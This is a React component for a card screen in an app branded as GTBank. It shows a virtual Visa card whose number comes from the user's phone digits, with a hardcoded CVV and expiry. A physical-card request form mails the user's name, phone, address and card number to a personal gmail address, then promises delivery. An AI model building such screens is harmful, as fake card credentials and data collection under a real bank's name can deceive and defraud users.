import { useState } from "react";
import { useAuth } from "../AuthContext";
import { COLORS as C } from "../constants";
import { S } from "../styles";

export default function Cards({ setScreen }) {
  const { user } = useAuth();
  const [cardVisible, setCardVisible] = useState(false);
  const [frozen, setFrozen] = useState(false);
  const [showRequestForm, setShowRequestForm] = useState(false);
  const [formSent, setFormSent] = useState(false);
  const [sending, setSending] = useState(false);
  const [form, setForm] = useState({
    address: "", city: "", state: "", phone: user?.phone || ""
  });
  const [formError, setFormError] = useState("");

  const cardNumber = user?.phone
    ? `4084 ${user.phone.slice(1,5)} ${user.phone.slice(5,9)} 4081`
    : "4084 0000 0000 4081";
  const maskedNumber = "4084 •••• •••• 4081";

  const handleRequestCard = () => {
    if (!form.address.trim() || !form.city.trim() || !form.state.trim()) {
      setFormError("Please fill in all fields");
      return;
    }
    setFormError("");
    setSending(true);

    const subject = `Physical Card Request — ${user?.full_name}`;
    const body = `
New Physical Card Request:

Name: ${user?.full_name}
Phone: ${form.phone}
Delivery Address: ${form.address}
City: ${form.city}
State: ${form.state}
Card Number: ${cardNumber}
Requested at: ${new Date().toLocaleString()}
    `.trim();

    window.location.href = `mailto:nliaustemak@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;

    setTimeout(() => {
      setFormSent(true);
      setSending(false);
    }, 1000);
  };

  return (
    <div style={{ ...S.wrap, paddingBottom: "80px" }}>

      {/* HEADER */}
      <div style={{
        backgroundColor: C.dark, padding: "16px 20px",
        display: "flex", alignItems: "center", justifyContent: "space-between"
      }}>
        <button
          onClick={() => showRequestForm ? setShowRequestForm(false) : setScreen("dashboard")}
          style={{ background: "none", border: "none", color: C.white, fontSize: "22px", cursor: "pointer" }}>
          ←
        </button>
        <h2 style={{ margin: 0, fontSize: "16px" }}>
          {showRequestForm ? "Request Physical Card" : "My Cards"}
        </h2>
        <span></span>
      </div>

      <div style={{ padding: "16px" }}>

        {/* REQUEST CARD FORM */}
        {showRequestForm && (
          <div style={S.card}>
            {!formSent ? (
              <>
                <p style={{ margin: "0 0 6px", fontWeight: "bold", color: C.gold }}>
                  💳 Delivery Details
                </p>
                <p style={{ margin: "0 0 16px", fontSize: "12px", color: C.gray }}>
                  Fill in your delivery address and we'll ship your physical Visa card within 5–7 business days.
                </p>

                {[
                  { key: "address", label: "Street Address", placeholder: "e.g. 12 Broad Street, Victoria Island" },
                  { key: "city", label: "City", placeholder: "e.g. Lagos" },
                  { key: "state", label: "State", placeholder: "e.g. Lagos State" },
                  { key: "phone", label: "Phone Number", placeholder: "e.g. 08012345678" }
                ].map(field => (
                  <div key={field.key} style={{ marginBottom: "12px" }}>
                    <p style={{ margin: "0 0 4px", fontSize: "12px", color: C.gray }}>
                      {field.label}
                    </p>
                    <input
                      style={S.input}
                      placeholder={field.placeholder}
                      value={form[field.key]}
                      onChange={e => setForm(prev => ({ ...prev, [field.key]: e.target.value }))}
                    />
                  </div>
                ))}

                {formError && (
                  <div style={S.error}>❌ {formError}</div>
                )}

                <div style={{ backgroundColor: `${C.gold}11`, border: `1px solid ${C.gold}44`, borderRadius: "10px", padding: "12px", marginBottom: "16px" }}>
                  <p style={{ margin: 0, fontSize: "12px", color: C.gold }}>
                    💡 Your card will be linked to account <strong>{cardNumber}</strong> and delivered to the address above.
                  </p>
                </div>

                <button
                  onClick={handleRequestCard}
                  disabled={sending}
                  style={{
                    ...S.btn,
                    backgroundColor: sending ? C.gray : C.gold,
                    color: C.navy
                  }}>
                  {sending ? "⏳ Submitting..." : "📧 Submit Card Request"}
                </button>
              </>
            ) : (
              <div style={{ textAlign: "center", padding: "20px 0" }}>
                <div style={{ fontSize: "60px", marginBottom: "12px" }}>💳</div>
                <h3 style={{ color: C.success, margin: "0 0 8px" }}>Request Submitted!</h3>
                <p style={{ color: C.gray, fontSize: "13px", margin: "0 0 6px" }}>
                  Your physical card request has been sent successfully.
                </p>
                <p style={{ color: C.gray, fontSize: "12px", margin: "0 0 20px" }}>
                  Delivery to <strong style={{ color: C.white }}>{form.address}, {form.city}</strong> within 5–7 business days.
                </p>
                <button
                  onClick={() => { setShowRequestForm(false); setFormSent(false); }}
                  style={{ ...S.btn, backgroundColor: C.orange }}>
                  Back to My Cards
                </button>
              </div>
            )}
          </div>
        )}

        {/* MAIN CARDS VIEW */}
        {!showRequestForm && (
          <>
            {/* VIRTUAL CARD */}
            <div style={{
              background: `linear-gradient(135deg, ${C.orange}, ${C.darkOrange})`,
              borderRadius: "20px", padding: "24px", marginBottom: "16px",
              position: "relative", overflow: "hidden",
              opacity: frozen ? 0.7 : 1
            }}>
              <div style={{
                position: "absolute", top: "-20px", right: "-20px",
                width: "150px", height: "150px", borderRadius: "50%",
                backgroundColor: "rgba(255,255,255,0.1)"
              }} />
              <div style={{
                position: "absolute", bottom: "-40px", right: "40px",
                width: "120px", height: "120px", borderRadius: "50%",
                backgroundColor: "rgba(255,255,255,0.05)"
              }} />
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "30px" }}>
                <p style={{ margin: 0, fontWeight: "bold", fontSize: "18px" }}>GTBank</p>
                <p style={{ margin: 0, fontSize: "13px", opacity: 0.8 }}>
                  {frozen ? "🔒 FROZEN" : "VIRTUAL CARD"}
                </p>
              </div>
              <p style={{ margin: "0 0 20px", fontSize: "18px", letterSpacing: "3px", fontFamily: "monospace" }}>
                {cardVisible ? cardNumber : maskedNumber}
              </p>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end" }}>
                <div>
                  <p style={{ margin: 0, fontSize: "10px", opacity: 0.7 }}>CARD HOLDER</p>
                  <p style={{ margin: 0, fontSize: "14px", fontWeight: "bold" }}>
                    {user?.full_name?.toUpperCase()}
                  </p>
                </div>
                <div style={{ textAlign: "right" }}>
                  <p style={{ margin: 0, fontSize: "10px", opacity: 0.7 }}>EXPIRES</p>
                  <p style={{ margin: 0, fontSize: "14px", fontWeight: "bold" }}>12/28</p>
                </div>
                <div style={{ textAlign: "right" }}>
                  <p style={{ margin: "0", fontSize: "20px", fontWeight: "bold", fontStyle: "italic" }}>VISA</p>
                </div>
              </div>
            </div>

            {/* CARD ACTIONS */}
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", marginBottom: "16px" }}>
              {[
                {
                  icon: cardVisible ? "🙈" : "👁",
                  label: cardVisible ? "Hide Details" : "Show Details",
                  action: () => setCardVisible(v => !v),
                  color: C.orange
                },
                {
                  icon: frozen ? "🔓" : "🔒",
                  label: frozen ? "Unfreeze Card" : "Freeze Card",
                  action: () => setFrozen(v => !v),
                  color: frozen ? C.success : C.error
                }
              ].map(item => (
                <button key={item.label} onClick={item.action} style={{
                  backgroundColor: C.card, border: `1px solid ${item.color}44`,
                  borderRadius: "12px", padding: "16px", cursor: "pointer",
                  textAlign: "center", color: C.white
                }}>
                  <p style={{ margin: "0 0 4px", fontSize: "24px" }}>{item.icon}</p>
                  <p style={{ margin: 0, fontSize: "13px", color: item.color, fontWeight: "bold" }}>
                    {item.label}
                  </p>
                </button>
              ))}
            </div>

            {/* CARD DETAILS */}
            {cardVisible && (
              <div style={S.card}>
                <p style={{ margin: "0 0 12px", fontWeight: "bold", color: C.orange }}>Card Details</p>
                {[
                  { label: "Card Number", value: cardNumber },
                  { label: "CVV", value: "408" },
                  { label: "Expiry", value: "12/28" },
                  { label: "Billing Address", value: "Nigeria" }
                ].map(item => (
                  <div key={item.label} style={S.feeRow}>
                    <span style={{ color: C.gray }}>{item.label}</span>
                    <span style={{ fontFamily: "monospace" }}>{item.value}</span>
                  </div>
                ))}
              </div>
            )}

            {/* CARD LIMITS */}
            <div style={S.card}>
              <p style={{ margin: "0 0 12px", fontWeight: "bold", color: C.orange }}>📊 Card Limits</p>
              {[
                { label: "Daily Spend", used: 2500, limit: 50000 },
                { label: "Monthly Spend", used: 15000, limit: 200000 },
                { label: "Online Transactions", used: 1000, limit: 10000 }
              ].map(item => (
                <div key={item.label} style={{ marginBottom: "12px" }}>
                  <div style={{ display: "flex", justifyContent: "space-between", marginBottom: "4px" }}>
                    <span style={{ fontSize: "13px" }}>{item.label}</span>
                    <span style={{ fontSize: "12px", color: C.gray }}>
                      ₦{item.used.toLocaleString()} / ₦{item.limit.toLocaleString()}
                    </span>
                  </div>
                  <div style={{ backgroundColor: "#1a2a4a", borderRadius: "10px", height: "6px" }}>
                    <div style={{
                      backgroundColor: C.orange, borderRadius: "10px",
                      height: "6px", width: `${Math.round((item.used / item.limit) * 100)}%`
                    }} />
                  </div>
                </div>
              ))}
            </div>

            {/* REQUEST PHYSICAL CARD */}
            <div style={{ ...S.card, border: `1px solid ${C.gold}44`, textAlign: "center" }}>
              <p style={{ fontSize: "30px", margin: "0 0 8px" }}>💳</p>
              <p style={{ margin: "0 0 4px", fontWeight: "bold", color: C.gold }}>
                Request Physical Card
              </p>
              <p style={{ margin: "0 0 16px", color: C.gray, fontSize: "12px" }}>
                Get a physical Visa debit card delivered to your address within 5–7 business days
              </p>
              <button
                onClick={() => { setShowRequestForm(true); setFormSent(false); }}
                style={{ ...S.btn, backgroundColor: C.gold, color: C.navy }}>
                💳 Request Physical Card
              </button>
            </div>
          </>
        )}
      </div>

      {/* BOTTOM NAV */}
      <div style={S.bottomNav}>
        {[
          { icon: "🏠", label: "Home", action: () => setScreen("dashboard") },
          { icon: "🎁", label: "Rewards", action: () => setScreen("rewards") },
          { icon: "📈", label: "Finance", action: () => setScreen("finance") },
          { icon: "💳", label: "Cards", action: () => setScreen("cards") },
          { icon: "👤", label: "Me", action: () => setScreen("profile") }
        ].map(item => (
          <button key={item.label} style={S.navBtn(item.label === "Cards")} onClick={item.action}>
            <span style={{ fontSize: "22px" }}>{item.icon}</span>
            <span>{item.label}</span>
          </button>
        ))}
      </div>
    </div>
  );
}